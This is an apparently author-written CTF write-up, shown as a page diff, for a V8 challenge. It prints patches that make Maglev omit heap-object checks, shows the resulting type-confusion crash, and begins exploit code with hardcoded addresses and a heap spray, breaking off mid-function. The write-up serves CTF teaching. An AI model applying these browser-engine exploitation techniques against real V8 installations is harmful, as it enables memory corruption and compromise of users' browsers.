@@ -1,0 +1,546 @@
+<!doctype html><html lang=en><head><title>triforce - TRX CTF Quals 2026 &ndash; kqx</title>
+<meta name=description content="kernel pwn and browser exploitation"><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=UTF-8><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.4/css/academicons.min.css integrity="sha512-IW0nhlW5MgNydsXJO40En2EoCkTTjZhI3yuODrZIc8cQ4h1XcF53PsqDHa09NqnkXuIe0Oiyyj171BqZFwISBw==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=stylesheet href=https://kqx.io/css/palettes/base16-dark.css><link rel=stylesheet href=https://kqx.io/css/risotto.css><link rel=icon href=https://kqx.io/images/favicon.ico><meta property="og:title" content="triforce - TRX CTF Quals 2026 &ndash; kqx"><meta property="og:url" content="https://kqx.io/writeups/triforce/"><meta property="og:type" content="website"><meta property="og:description" content="A V8 exploitation challenge I authored for TRX CTF Quals 2026 "><meta property="og:image" content="https://kqx.io/images/banner.jpg"></head><body><div class=page><header class=page__header><nav class="page__nav main-nav"><ul><li class=nomarker><h1 class=page__logo><a href=https://kqx.io/ class=page__logo-inner>kqx</a></h1></li><li class=main-nav__item><a class=nav-main-item href=https://kqx.io/about/ title>about</a></li><li class=main-nav__item><a class=nav-main-item href=https://kqx.io/post/ title>posts</a></li><li class=main-nav__item><a class=nav-main-item href=https://kqx.io/writeups/ title>writeups</a></li></ul></nav></header><section class=page__body><header><h1>triforce - TRX CTF Quals 2026</h1></header><div><h2 id=description>Description</h2><p>Maglev (derived from magnetic levitation) is a system of rail transport whose rolling stock is levitated by electromagnets rather than rolled on wheels, eliminating rolling resistance.</p><h2 id=challenge-overview>Challenge Overview</h2><p>The challenge is split into 2 parts, this one, where the objective is gaining R/W inside the V8 heap sandbox, and the second one (<a href=/writeups/triforce-sbx/>Click here for the writeup!</a>) where the goal is escaping the sandbox and achieving code execution.</p><p>Let&rsquo;s take a look at the provided V8 patches, in this post we will only be looking at <code>triforce.patch</code>, as <code>sbx.patch</code> is only relevant for the second part.</p><p>The patch starts by introducing a new builtin method named <strong>Triforce</strong> (and also removes unwanted builtins to prevent cheesy unintended solves).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>diff --git a/src/d8/d8.cc b/src/d8/d8.cc
+</span></span><span style=display:flex><span>index bac27d18768..8e7ff3b85db 100644
+</span></span><span style=display:flex><span><span style=color:#f92672>--- a/src/d8/d8.cc
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/src/d8/d8.cc
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -3268,6 +3268,65 @@ void WriteAndFlush(FILE* file,
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>   fflush(file);
+</span></span><span style=display:flex><span> }
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#a6e22e>+bool hatenoCheese = false;
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+void Shell::Triforce(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) {
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  DCHECK(i::ValidateCallbackInfo(info));
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  Isolate* isolate = info.GetIsolate();
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  if (info.Length() != 1) {
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    ThrowError(isolate, &#34;The Triforce is missing!&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    return;
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  }
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  if (!info[0]-&gt;IsString()) {
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    ThrowError(isolate, &#34;The real Triforce is a String!&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    return;
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  }
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  Local&lt;String&gt; triforce = info[0].As&lt;String&gt;();
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  Local&lt;String&gt; power =
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+      String::NewFromUtf8Literal(isolate, &#34;Power&#34;, NewStringType::kInternalized);
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  Local&lt;String&gt; wisdom =
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+      String::NewFromUtf8Literal(isolate, &#34;Wisdom&#34;, NewStringType::kInternalized);
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  Local&lt;String&gt; courage =
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+      String::NewFromUtf8Literal(isolate, &#34;Courage&#34;, NewStringType::kInternalized);
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  if (!triforce-&gt;StringEquals(power)) {
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    ThrowError(isolate, &#34;You are lacking Power...&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    return;
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  }
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  base::OS::Sleep(base::TimeDelta::FromSeconds(1));
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  if (!triforce-&gt;StringEquals(wisdom)) {
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    ThrowError(isolate, &#34;You are lacking Wisdom...&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    return;
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  }
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  base::OS::Sleep(base::TimeDelta::FromSeconds(1));
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  if (!triforce-&gt;StringEquals(courage)) {
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    ThrowError(isolate, &#34;You are lacking Courage...&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    return;
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  }
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  hatenoCheese = false;
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  MaybeLocal&lt;String&gt; ret = Shell::ReadFile(isolate, std::getenv(&#34;FLAG&#34;), false);
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  hatenoCheese = true;
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  if (ret.IsEmpty()) {
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    std::cerr &lt;&lt; &#34;Failed to read flag, please open a ticket.\n&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    ThrowError(isolate, &#34;Failed to read flag, please open a ticket.&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    return;
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  }
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  info.GetReturnValue().Set(ret.ToLocalChecked());
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+}
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> void Shell::Print(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) {
+</span></span><span style=display:flex><span>   WriteAndFlush(stdout, info);
+</span></span><span style=display:flex><span> }
+</span></span><span style=display:flex><span><span style=color:#75715e>@@ -4315,9 +4374,12 @@ Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) {
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>   global_template-&gt;Set(isolate, &#34;version&#34;,
+</span></span><span style=display:flex><span>                        FunctionTemplate::New(isolate, Version));
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#a6e22e>+  global_template-&gt;Set(isolate, &#34;triforce&#34;,
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+                       FunctionTemplate::New(isolate, Triforce));
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>   global_template-&gt;Set(isolate, &#34;print&#34;, FunctionTemplate::New(isolate, Print));
+</span></span><span style=display:flex><span>   global_template-&gt;Set(isolate, &#34;printErr&#34;,
+</span></span><span style=display:flex><span>                        FunctionTemplate::New(isolate, PrintErr));
+</span></span><span style=display:flex><span><span style=color:#a6e22e>+  /*
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>   global_template-&gt;Set(isolate, &#34;write&#34;,
+</span></span><span style=display:flex><span>                        FunctionTemplate::New(isolate, WriteStdout));
+</span></span><span style=display:flex><span>   if (!i::v8_flags.fuzzing) {
+</span></span><span style=display:flex><span><span style=color:#75715e>@@ -4343,8 +4405,9 @@ Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) {
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>   global_template-&gt;Set(isolate, &#34;Realm&#34;, Shell::CreateRealmTemplate(isolate));
+</span></span><span style=display:flex><span>   global_template-&gt;Set(isolate, &#34;performance&#34;,
+</span></span><span style=display:flex><span>                        Shell::CreatePerformanceTemplate(isolate));
+</span></span><span style=display:flex><span><span style=color:#a6e22e>+  */
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>   global_template-&gt;Set(isolate, &#34;Worker&#34;, Shell::CreateWorkerTemplate(isolate));
+</span></span><span style=display:flex><span><span style=color:#f92672>-
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+  /*
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>   // Prevent fuzzers from creating side effects.
+</span></span><span style=display:flex><span>   if (!i::v8_flags.fuzzing) {
+</span></span><span style=display:flex><span>     global_template-&gt;Set(isolate, &#34;os&#34;, Shell::CreateOSTemplate(isolate));
+</span></span><span style=display:flex><span><span style=color:#75715e>@@ -4355,7 +4419,7 @@ Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) {
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     global_template-&gt;Set(isolate, &#34;async_hooks&#34;,
+</span></span><span style=display:flex><span>                          Shell::CreateAsyncHookTemplate(isolate));
+</span></span><span style=display:flex><span>   }
+</span></span><span style=display:flex><span><span style=color:#f92672>-
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+  */
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>   return global_template;
+</span></span><span style=display:flex><span> }
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#75715e>@@ -5316,6 +5380,10 @@ void Shell::ReadLine(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) {
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span> // Reads a file into a memory blob.
+</span></span><span style=display:flex><span> std::unique_ptr&lt;base::OS::MemoryMappedFile&gt; Shell::ReadFileData(
+</span></span><span style=display:flex><span>     Isolate* isolate, const char* name, bool should_throw) {
+</span></span><span style=display:flex><span><span style=color:#a6e22e>+  if (hatenoCheese) {
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    return nullptr;
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+  }
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>   std::unique_ptr&lt;base::OS::MemoryMappedFile&gt; file(
+</span></span><span style=display:flex><span>       base::OS::MemoryMappedFile::open(
+</span></span><span style=display:flex><span>           name, base::OS::MemoryMappedFile::FileMode::kReadOnly));
+</span></span><span style=display:flex><span><span style=color:#75715e>@@ -5344,7 +5412,7 @@ MaybeLocal&lt;String&gt; Shell::ReadFile(Isolate* isolate, const char* name,
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>   static_assert(String::kMaxLength &lt;= i::kMaxInt);
+</span></span><span style=display:flex><span>   int size = static_cast&lt;int&gt;(full_file_size);
+</span></span><span style=display:flex><span>   char* chars = static_cast&lt;char*&gt;(file-&gt;memory());
+</span></span><span style=display:flex><span><span style=color:#f92672>-  if (i::v8_flags.use_external_strings &amp;&amp; i::String::IsAscii(chars, size)) {
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+  if (i::String::IsAscii(chars, size)) {
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>     String::ExternalOneByteStringResource* resource =
+</span></span><span style=display:flex><span>         new i::OwningExternalOneByteStringResource(
+</span></span><span style=display:flex><span>             std::string_view(chars, size));
+</span></span><span style=display:flex><span><span style=color:#75715e>@@ -5821,6 +5889,7 @@ bool SourceGroup::Execute(Isolate* isolate) {
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>       printf(&#34;Error reading &#39;%s&#39;\n&#34;, arg);
+</span></span><span style=display:flex><span>       base::OS::ExitProcess(1);
+</span></span><span style=display:flex><span>     }
+</span></span><span style=display:flex><span><span style=color:#a6e22e>+    hatenoCheese = true;
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>     Shell::set_script_executed();
+</span></span><span style=display:flex><span>     Shell::update_script_size(source-&gt;Length());
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>diff --git a/src/d8/d8.h b/src/d8/d8.h
+</span></span><span style=display:flex><span>index 913a5c470c5..02332fcee68 100644
+</span></span><span style=display:flex><span><span style=color:#f92672>--- a/src/d8/d8.h
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/src/d8/d8.h
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -672,6 +672,7 @@ class Shell : public i::AllStatic {
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span> 
+</span></span><span style=display:flex><span>   static void ResetOnProfileEndListener(Isolate* isolate);
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#a6e22e>+  static void Triforce(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info);
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>   static void Print(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info);
+</span></span><span style=display:flex><span>   static void PrintErr(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info);
+</span></span><span style=display:flex><span>   static void WriteStdout(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info);
+</span></span></code></pre></div><p>By reading the builtin&rsquo;s code we can learn the win condition of the challenge; we need to provide a string that is equal to <strong>&ldquo;Power&rdquo;</strong>, <strong>&ldquo;Wisdom&rdquo;</strong> and <strong>&ldquo;Courage&rdquo;</strong> at the same time, with a 1-second interval in-between the string comparisons.</p><p>We also need to provide a &ldquo;real&rdquo; string object, therefore it&rsquo;s not possible to use proxy objects or similar stuff.</p><p>This might seem impossible at first, as strings are immutable in JS, but thanks to the arb R/W primitives we&rsquo;ll cook up due to the 2nd part of the patch we&rsquo;ll be able to get our flag.</p><p>Talking about said the patch:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>diff --git a/src/maglev/maglev-reducer.h b/src/maglev/maglev-reducer.h
+</span></span><span style=display:flex><span>index a607dc81a8d..c071240d17c 100644
+</span></span><span style=display:flex><span><span style=color:#f92672>--- a/src/maglev/maglev-reducer.h
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/src/maglev/maglev-reducer.h
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -284,11 +284,14 @@ class MaglevReducer {
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>   }
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>   static enum CheckType GetCheckType(NodeType type, ValueNode* target) {
+</span></span><span style=display:flex><span><span style=color:#f92672>-    if (NodeTypeIs(type, NodeType::kAnyHeapObject)) {
+</span></span></span><span style=display:flex><span><span style=color:#f92672>-      if (target &amp;&amp; target-&gt;Is&lt;Phi&gt;()) {
+</span></span></span><span style=display:flex><span><span style=color:#f92672>-        target-&gt;Cast&lt;Phi&gt;()-&gt;SetUseRequiresHeapObject();
+</span></span></span><span style=display:flex><span><span style=color:#f92672>-      }
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+    if (1) {
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>       return CheckType::kOmitHeapObjectCheck;
+</span></span><span style=display:flex><span><span style=color:#a6e22e>+      /*Do Clankers dream of Tokenized Sheep?
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+      https://issues.chromium.org/issues/457296138
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+      https://issues.chromium.org/issues/447039449
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+      https://issues.chromium.org/issues/392938070
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+      https://issues.chromium.org/issues/40671685
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+      */
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>     } else {
+</span></span><span style=display:flex><span>       return CheckType::kCheckHeapObject;
+</span></span><span style=display:flex><span>     }
+</span></span></code></pre></div><p>Leaving the issues aside&mldr; (Read them if you want a laugh)
+<img src=/images/triforce/discord.png alt=discord.png></p><p>The patch is making <code>GetCheckType()</code> inside V8&rsquo;s mid-tier JIT compiler <strong>Maglev</strong> always return <code>CheckType::kOmitHeapObjectCheck</code>.</p><p>Let&rsquo;s see what this means and how we can exploit it.</p><h2 id=maglev>Maglev</h2><p>Read <a href=https://v8.dev/blog/maglev>this</a> for an overview on Maglev.</p><p>Maglev performs many optimizations, one of which is tracking the types of its nodes to decide if omitting certain checks is safe or not.</p><p>For example Maglev normally emits a heap-object check unless the value is statically determined to be a heap object, the patch changes this behaviour and makes it so Maglev always elides these checks, even when it&rsquo;s unsafe to do so.</p><p>Let&rsquo;s try a little example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>foo</span>(<span style=color:#a6e22e>x</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>0</span>];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>%</span><span style=color:#a6e22e>PrepareFunctionForOptimization</span>(<span style=color:#a6e22e>foo</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>foo</span>([<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>]);
+</span></span><span style=display:flex><span><span style=color:#f92672>%</span><span style=color:#a6e22e>OptimizeFunctionOnNextCall</span>(<span style=color:#a6e22e>foo</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>foo</span>([<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>]);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>foo</span>(<span style=color:#ae81ff>0xbeef</span>);
+</span></span></code></pre></div><p>In this case the function will be optimized by <strong>Turbofan</strong>, not Maglev, therefore it should deoptimize safely.</p><p>Let&rsquo;s run it with this flag <code>--trace-deopt</code> to observe its behaviour:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./d8 --allow-natives-syntax --trace-deopt test.js 
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>bailout <span style=color:#f92672>(</span>kind: deopt-eager, reason: Smi<span style=color:#f92672>)</span>: begin. deoptimizing 0x3bbf010192b9 &lt;JSFunction foo <span style=color:#f92672>(</span>sfi <span style=color:#f92672>=</span> 0x3bbf010191e9<span style=color:#f92672>)</span>&gt;, 0x0a80010002a9 &lt;Code TURBOFAN_JS&gt;, opt id 0, bytecode offset 1, deopt exit 0, FP to SP delta 32, caller SP 0x7ffc237ea7b0, pc 0x565c67c000cc<span style=color:#f92672>]</span>
+</span></span></code></pre></div><p>As expected it&rsquo;s deoptimizing safely as the function wasn&rsquo;t optimized for an Smi.</p><p>Now let&rsquo;s try using Maglev:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>foo</span>(<span style=color:#a6e22e>x</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>0</span>];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>%</span><span style=color:#a6e22e>PrepareFunctionForOptimization</span>(<span style=color:#a6e22e>foo</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>foo</span>([<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>]);
+</span></span><span style=display:flex><span><span style=color:#f92672>%</span><span style=color:#a6e22e>OptimizeMaglevOnNextCall</span>(<span style=color:#a6e22e>foo</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>foo</span>([<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>]);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>foo</span>(<span style=color:#ae81ff>0xbeef</span>);
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./d8 --allow-natives-syntax --trace-deopt test.js 
+</span></span><span style=display:flex><span>Received signal <span style=color:#ae81ff>11</span> SEGV_ACCERR 000000017ddd
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>====</span> C stack trace <span style=color:#f92672>===============================</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>./d8<span style=color:#f92672>(</span>_ZN2v84base5debug10StackTraceC1Ev+0x1e<span style=color:#f92672>)[</span>0x5dcc6e8d928e<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>./d8<span style=color:#f92672>(</span>+0x3b981d6<span style=color:#f92672>)[</span>0x5dcc6e8d91d6<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>/lib/x86_64-linux-gnu/libc.so.6<span style=color:#f92672>(</span>+0x45330<span style=color:#f92672>)[</span>0x71cab3a45330<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0x5dccce68005b<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>end of stack trace<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>Segmentation fault <span style=color:#f92672>(</span>core dumped<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>Due to the patch Maglev skips the necessary checks, and it ends up crashing because it&rsquo;s interpreting an Smi as an heap object, we therefore have a type confusion we can exploit.</p><h2 id=exploitation-strategy>Exploitation Strategy</h2><p>Given this primitive there are plenty of paths one could take to exploit it, I&rsquo;ll explain the one I used, which while overcomplicated I believe to be interesting.</p><p>Consider this snippet of code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>conv_ab</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>conv_f64</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Float64Array</span>(<span style=color:#a6e22e>conv_ab</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>conv_u64</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>BigUint64Array</span>(<span style=color:#a6e22e>conv_ab</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>EMPTY_PROPERTIES_ADDR</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x7e5</span><span style=color:#a6e22e>n</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>MAP_JSARR_PACKED_DOUBLES_ADDR</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x100ba71</span><span style=color:#a6e22e>n</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>FIXED_ARRAY</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x38c002a</span><span style=color:#a6e22e>n</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>EVIL_SMI</span> <span style=color:#f92672>=</span> (Number(<span style=color:#a6e22e>FIXED_ARRAY</span>) <span style=color:#f92672>/</span> <span style=color:#ae81ff>2</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>x</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>conv_u64</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>BigInt</span>(<span style=color:#a6e22e>x</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>conv_f64</span>[<span style=color:#ae81ff>0</span>];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>x</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>conv_f64</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>conv_u64</span>[<span style=color:#ae81ff>0</span>];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>spray</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Array(<span style=color:#ae81ff>0x4fe0000</span><span style=color:#f92672>/</span><span style=color:#ae81ff>8</span>); <span style=color:#75715e>//FIXED_ARRAY should be constant
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>spray</span>[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>MAP_JSARR_PACKED_DOUBLES_ADDR</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>spray</span>[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>(<span style=color:#ae81ff>0xbeef</span><span style=color:#a6e22e>n</span> <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>trigger</span>(<span style=color:#a6e22e>obj</span>, <span style=color:#a6e22e>x</span>) {  
